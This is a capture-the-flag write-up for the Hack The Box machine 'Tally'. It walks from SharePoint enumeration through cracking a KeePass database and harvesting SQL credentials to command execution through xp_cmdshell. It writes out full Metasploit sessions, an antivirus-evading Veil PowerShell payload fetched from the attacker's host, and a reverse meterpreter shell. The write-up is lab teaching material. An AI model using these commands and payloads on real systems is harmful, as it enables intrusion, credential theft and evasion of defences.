# Tally
#### 10.10.10.59
###### Dotaplayer365


```
nmap 10.10.10.59

PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
81/tcp   open  hosts2-ns
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
808/tcp  open  ccproxy-http
1433/tcp open  ms-sql-s
```


Checking the port 80 shows us that its a Sharepoint server.

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Tally/images/Website.PNG"></kbd>


When in Thermopylae call a SPartan
Resource: http://github.com/sensepost/SPartan


<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Tally/images/Spartan.PNG"></kbd>

One of the pages we find has something juicy!
```
...
[+] [147][200][62875b] - http://10.10.10.59/Shared%20Documents/Forms/AllItems.aspx
...
```
<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Tally/images/Allitems.PNG"></kbd>

Lets download "ftp-details.docx and see what its got
```
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

Interesting

Now we know the ftp password.

We would just need to guess the ftp user

My general guesses as always are (root, ftpuser, ftp_user, ftp-user, ftp, user and afcourse anonymous logins)

You can call me a wordlist cause one of them worked!! :D

FTP Username: ftp_user
FTP Password: UTDRSCH53c"$6hys
```
ftp 10.10.10.59
Name (10.10.10.59:root): ftp_user
Password:
230 User logged in.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-31-17  10:51PM       <DIR>          From-Custodian
12-08-17  09:01AM       <DIR>          Intranet
08-28-17  05:56PM       <DIR>          Logs
09-15-17  08:30PM       <DIR>          To-Upload
09-17-17  08:27PM       <DIR>          User
226 Transfer complete.
```

As we remember it was instructed that the person create his own folder when he logs in.

So we go into Users and try searching for something nice

Under /User/Tim/Files we find something Nice !!
```
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-15-17  07:58PM                   17 bonus.txt
09-15-17  08:24PM       <DIR>          KeePass-2.36
09-15-17  08:22PM                 2222 tim.kdbx
```

Lets get brute forcing

Create a hash using keepass2john
```
root@kali:~/Hackthebox/Tally# keepass2john tim.kdbx 
tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da5f0f
```

Hashcat GG
```
.\hashcat64.exe -m 13400 .\hash.txt .\rockyou.txt  --show
$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da5f0f:simplementeyo
```
Keepass Password: simplementeyo

After opening the kdbx with the new password we get some data which looks like this
```
TALLY ACCT share : Finance : Acc0unting
CISCO : cisco : cisco123
PDF Writer : 64257-56525-54257-54734 : 
```

Tally Account Share!!

Looks like a SMB share to me, lets check it out!

```
smbclient -L 10.10.10.59 -U Finance
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\Finance's password: 
Domain=[TALLY] OS=[Windows Server 2016 Standard 14393] Server=[Windows Server 2016 Standard 6.3]

	Sharename       Type      Comment
	---------       ----      -------
	ACCT            Disk      
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Lets mount the ACCT share
```
mount -t cifs -o username=Finance,password=Acc0unting //10.10.10.59/ACCT /mnt
```

After a lot of scouring through the files

We find a exe called tester.exe

```
root@kali:/mnt/zz_Migration/Binaries/New folder# strings tester.exe 
...
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
...
```

Looks like SQL Creds to me xD

Launchint Metasploit!

**user.txt**

```
msf > use auxiliary/admin/mssql/mssql_exec
msf auxiliary(mssql_exec) > set CMD cmd.exe /c type C:\\Users\\Sarah\\Desktop\\user.txt
msf auxiliary(mssql_exec) > set PASSWORD GWE3V65#6KFH93@4GWTG2G 
msf auxiliary(mssql_exec) > set RHOST 10.10.10.59
msf auxiliary(mssql_exec) > show options

Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                                  Required  Description
   ----                 ---------------                                  --------  -----------
   CMD                  cmd.exe /c type C:\Users\Sarah\Desktop\user.txt  no        Command to execute
   PASSWORD             GWE3V65#6KFH93@4GWTG2G                           no        The password for the specified username
   RHOST                10.10.10.59                                      yes       The target address
   RPORT                1433                                             yes       The target port (TCP)
   TDSENCRYPTION        false                                            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa                                               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(mssql_exec) > run
[*] 10.10.10.59:1433 - The server may have xp_cmdshell disabled, trying to enable it...
[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'cmd.exe /c type C:\Users\Sarah\Desktop\user.txt'
 output
 ------
 be72362e8dffeca2b42406d5d1c74bb1

[*] Auxiliary module execution completed
```

Now that we know that there is superb command execution on the machine, we can get a reverse shell

Its safe to assume that if this is a Sharepoint Server, it might have some AV Protection (Atleast Windows defender :wink: )

Veil-Evasion Incoming!!

```
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Veil-Evasion Menu

	41 payloads loaded

Available Commands:

	back			Go to main Veil menu
	checkvt			Check virustotal against generated hashes
	clean			Remove generated artifacts
	exit			Exit Veil
	info			Information on a specific payload
	list			List available payloads
	use			Use a specific payload

```

We do a listing of the exploits and we find a **powershell/meterpreter/rev_tcp.py** at 22

We set the LHOST and LPORT
```
LHOST           	10.10.14.186	IP of the Metasploit handler
LPORT           	4444    	Port of the Metasploit handler
```

And hit generate
```
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/Tally.bat
 [*] Metasploit RC file written to: /var/lib/veil/output/handlers/Tally.rc
```

Lets copy those 2 files to our folder and start a python SimpleHTTPServer there on port 80

```
root@kali:~/hackthebox/Machines/Tally# cp /var/lib/veil/output/source/Tally.bat Tally.bat
root@kali:~/hackthebox/Machines/Tally# cp /var/lib/veil/output/handlers/Tally.rc Tally.rc
root@kali:~/hackthebox/Machines/Tally# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

We also need to create a listner

```
root@kali:~/hackthebox/Machines/Tally# msfconsole -r Tally.rc 

[*] Processing Tally.rc for ERB directives.
resource (Tally.rc)> use exploit/multi/handler
resource (Tally.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (Tally.rc)> set LHOST 10.10.14.186
LHOST => 10.10.14.186
resource (Tally.rc)> set LPORT 4444
LPORT => 4444
resource (Tally.rc)> set ExitOnSession false
ExitOnSession => false
resource (Tally.rc)> exploit -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.14.186:4444 
```

Going back to our mssql_exec lets issue a command which will download the bat file from our http server

```
msf auxiliary(mssql_exec) > set CMD powershell.exe /c Invoke-WebRequest -Uri 10.10.14.186/Tally.bat -OutFile C:\\Users\\Sarah\\dotalol.bat
CMD => powershell.exe /c Invoke-WebRequest -Uri 10.10.14.186/Tally.bat -OutFile C:\Users\Sarah\dotalol.bat
msf auxiliary(mssql_exec) > run

[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'powershell.exe /c Invoke-WebRequest -Uri 10.10.14.186/Tally.bat -OutFile C:\Users\Sarah\dotalol.bat'
[*] Auxiliary module execution completed


root@kali:~/hackthebox/Machines/Tally# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.59 - - [09/Dec/2017 03:02:04] "GET /Tally.bat HTTP/1.1" 200 -
```

We can confirm that it was successfully downloaded on the machine with the SimpleHTTPlog

Now we execute the batch file and wait for the reverse shell!

```
msf auxiliary(mssql_exec) > set CMD cmd.exe /c C:\\Users\\Sarah\\dotalol.bat
CMD => cmd.exe /c C:\Users\Sarah\dotalol.bat
msf auxiliary(mssql_exec) > run

[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'cmd.exe /c C:\Users\Sarah\dotalol.bat'
[*] Auxiliary module execution completed


msf exploit(handler) > [*] Sending stage (179267 bytes) to 10.10.10.59
[*] Meterpreter session 1 opened (10.10.14.186:4444 -> 10.10.10.59:54539)
meterpreter > sysinfo
Computer        : TALLY
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_GB
Domain          : HTB.LOCAL
Logged On Users : 5
Meterpreter     : x86/windows
```

There is just one problem

Our shell is x86 while the system is x64

Upgrading our shell to x64 is not that diffucult when we have metasploit at our disposal :D

```
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(handler) > use windows/local/payload_inject
msf exploit(payload_inject) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(payload_inject) > set LHOST 10.10.14.186
LHOST => 10.10.14.186
msf exploit(payload_inject) > set LPORT 4443
LPORT => 4443
msf exploit(payload_inject) > set SESSION 1
SESSION => 1
msf exploit(payload_inject) > show options

Module options (exploit/windows/local/payload_inject):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   NEWPROCESS  false            no        New notepad.exe to inject to
   PID                          no        Process Identifier to inject of process to inject payload.
   SESSION     1                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.186     yes       The listen address
   LPORT     4443             yes       The listen port

msf exploit(payload_inject) > exploit

[*] Started reverse TCP handler on 10.10.14.186:4443 
[*] Running module against TALLY
[-] PID  does not actually exist.
[*] Launching notepad.exe...
[*] Preparing 'windows/x64/meterpreter/reverse_tcp' for PID 5452
[*] Sending stage (205379 bytes) to 10.10.10.59
[*] Meterpreter session 2 opened (10.10.14.186:4443 -> 10.10.10.59:54560) at 2017-12-09 03:07:59 +0530

meterpreter > sysinfo
Computer        : TALLY
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_GB
Domain          : HTB.LOCAL
Logged On Users : 5
Meterpreter     : x64/windows
```

Why do you spoil me Metasploit!!!!


=> Root Potato Doh!


![Alt test](https://media.giphy.com/media/hKNPxrffFH0GY/giphy.gif "Suuure")
